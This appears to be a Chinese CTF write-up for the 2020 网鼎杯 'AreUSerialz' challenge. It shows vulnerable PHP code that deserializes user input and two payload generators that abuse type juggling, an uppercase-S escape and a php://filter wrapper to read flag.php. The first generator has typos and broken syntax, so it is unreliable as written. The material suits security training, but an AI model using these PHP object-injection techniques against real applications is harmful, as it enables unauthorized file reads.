题目:网鼎杯 2020 青龙组]AreUSerialz 1

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

分析:</br>
明确一点:_construct() 在反序列化的时候不会明确调用，相反，_destruct() 函数肯定会调用
```php
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
```
这里，我们应该想办法读取文件，于是，op必须是2，但由于==="2",可以使用int 2绕过;
接下来 在 process函数调用 read() 函数，利用php伪协议读取文件
```php
php://filter/read=convert.base64-encode/resource=flag.php
```
删减后:
```php
class FileHandler {

    protected $op;
    protected $filename;
    protected $content;
    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }
        function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}
    if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

```
还应注意到:
is_valid() 函数过滤了不可见字符
例子
```php
class ctf{
    private $a=1;
    protected $b=2;
}
//输出:
O%3A3%3A%22ctf%22%3A2%3A%7Bs%3A6%3A%22%00ctf%00a%22%3Bi%3A1%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A2%3B%7D
```
而在 反序列化中:
```
protected:%00*%00
```
1）o p , op,op,filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验
　　利用大写S采用的16进制，来绕过is_valid中对空字节的检查。 //00 替换 %00 。
　（2）强比较和弱比较的利用。将op设置为int型的2，op === "2"为false，op == "2"为true,绕过析构函数中的if判断，同时又可以调用到读文件的流程
于是构造payload
```php
<? php
class FileHandler {
    protected $op=2;
    protected $filename=flag.php;
    protected $content;
}
$a=new FileHandler();
$b = urlencode(serialize($a));
$b = str_replace('s','S',$b);
$b = str_repalace('%00%','\\00',$b);
echo $b;
```
第二种方法:
```php
   class FileHandler{
   public $op=2;
   public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
   public $content=2;
   }
   $a = new FileHandler();
   echo serialize($a);  
```
本地 php7.1 public 和 protected 反序列化后无区别